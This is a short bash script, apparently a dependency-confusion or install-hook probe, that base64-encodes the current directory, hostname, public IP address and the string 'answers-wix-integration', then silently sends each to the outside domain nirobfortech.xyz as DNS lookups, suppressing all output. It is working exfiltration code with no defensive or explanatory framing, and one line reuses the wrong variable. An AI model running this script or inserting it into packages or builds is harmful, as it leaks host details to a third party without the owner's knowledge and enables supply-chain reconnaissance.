#!/usr/bin/bash

a=$(pwd | head | base64) && dig $a.nirobfortech.xyz > /dev/null 2>&1;
b=$(hostname | head | base64) && dig $b.nirobfortech.xyz > /dev/null 2>&1;
c=$(curl ifconfig.me | head | base64) && dig $c.nirobfortech.xyz > /dev/null 2>&1;
d=$(echo "answers-wix-integration" | head | base64) && dig $d.nirobfortech.xyz > /dev/null 2>&1;
e=$(echo "this-thats" | head | base64) && dig $a.nirobfortech.xyz > /dev/null 2>&1;

#echo $a && $b && $c  > /dev/null 2>&1;
